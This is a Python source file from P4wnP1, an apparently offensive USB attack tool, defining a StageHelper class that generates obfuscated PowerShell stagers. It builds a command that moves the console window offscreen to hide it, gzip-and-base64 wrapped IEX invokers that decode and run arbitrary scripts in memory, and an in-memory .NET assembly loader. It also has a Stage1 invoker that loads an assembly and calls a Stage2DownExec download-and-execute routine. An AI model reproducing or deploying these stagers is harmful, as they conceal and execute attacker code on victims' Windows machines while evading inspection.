#!/usr/bin/python


#    This file is part of P4wnP1.
#
#    Copyright (c) 2017, Marcus Mengs. 
#
#    P4wnP1 is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    P4wnP1 is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with P4wnP1.  If not, see <http://www.gnu.org/licenses/>.


# Author: Marcus Mengs (MaMe82)

class StageHelper:
	@staticmethod
	def out_PS_SetWindowPos(x = -400,  y = -400,  cx = 100,  cy = 100,  flags = 0x4000+0x04):
		swpos = '$h=(Get-Process -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios (1,$h);$i=New-Object $ios (2,0);(([reflection.assembly]::LoadWithPartialName("WindowsBase")).GetType("MS.Win32.UnsafeNativeMethods"))::SetWindowPos($hw,$i,{0},{1},{2},{3},{4})'.format(x, y, cx, cy, flags)
		return swpos

	@staticmethod
	def gzipstream(data):
		import zlib
		gzip_compress = zlib.compressobj(9, zlib.DEFLATED, zlib.MAX_WBITS + 16) # compatible to Windows GZipStream
		gzip_data = gzip_compress.compress(data) + gzip_compress.flush()
		return gzip_data

	@staticmethod	
	def b64encode(data):
		import base64
		return base64.b64encode(data)		
		
	@staticmethod	
	def b64gzip(data):
		return StageHelper.b64encode(StageHelper.gzipstream(data))
				
	@staticmethod	
	def out_PS_IEX_Invoker(ps_script):
		b64 = StageHelper.b64gzip(ps_script)
		return "$b='{0}';nal no New-Object -F;iex (no IO.StreamReader(no IO.Compression.GZipStream((no IO.MemoryStream -A @(,[Convert]::FromBase64String($b))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()".format(b64)

	@staticmethod
	def out_PS_var_bytearray(rawdata, varname):
		b64 = StageHelper.b64gzip(rawdata)
		# not NET 2.0 compatible
		#return "$b='{0}';nal no New-Object -F;$ms=no IO.MemoryStream ;(no IO.Compression.GZipStream((no IO.MemoryStream -A @(,[Convert]::FromBase64String($b))),[IO.Compression.CompressionMode]::Decompress)).CopyTo($ms);${1}=$ms.ToArray()".format(b64,varname)
		return "$b='" + b64 + "';nal no New-Object -F;$g=(no IO.Compression.GZipStream((no IO.MemoryStream -A @(,[Convert]::FromBase64String($b))),[IO.Compression.CompressionMode]::Decompress));$bs=@();while($true){$b=$g.ReadByte();if($b -eq -1){break;};$bs+=$b};$" + varname + "=[byte[]]$bs"
		
	@staticmethod
	def out_PS_assembly_loader(rawdata):
		b64 = StageHelper.b64gzip(rawdata)
		# not NET 2.0 compatible
		#return "$b='{0}';nal no New-Object -F;$ms=no IO.MemoryStream ;(no IO.Compression.GZipStream((no IO.MemoryStream -A @(,[Convert]::FromBase64String($b))),[IO.Compression.CompressionMode]::Decompress)).CopyTo($ms);[System.Reflection.Assembly]::Load($ms.ToArray())".format(b64)
		return "$b='" + b64 + "';nal no New-Object -F;$g=(no IO.Compression.GZipStream((no IO.MemoryStream -A @(,[Convert]::FromBase64String($b))),[IO.Compression.CompressionMode]::Decompress));$bs=@();while($true){$b=$g.ReadByte();if($b -eq -1){break;};$bs+=$b};[System.Reflection.Assembly]::Load([byte[]]$bs)"
		
		
	@staticmethod
	def out_PS_var_string(rawdata, varname):
		b64 = StageHelper.b64gzip(rawdata)
		return "$b='{0}';nal no New-Object -F;${1}=(no IO.StreamReader(no IO.Compression.GZipStream((no IO.MemoryStream -A @(,[Convert]::FromBase64String($b))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()".format(b64, varname)

	@staticmethod
	def out_PS_Stage1_invoker(filename):
		data = None
		with open(filename, "rb") as f:
			data=f.read()

		return StageHelper.out_PS_assembly_loader(data)+";[Stage1.Device]::Stage2DownExec('deadbeefdeadbeef','MaMe82')"







#out = "$b='{0}';nal no New-Object -F;iex (no IO.StreamReader(no IO.Compression.GZipStream((no IO.MemoryStream -A @(,[Convert]::FromBase64String($b))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()".format(b64)
#out = "$b='{0}';nal no New-Object -F;$res=(no IO.StreamReader(no IO.Compression.GZipStream((no IO.MemoryStream -A @(,[Convert]::FromBase64String($b))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()".format(b64)

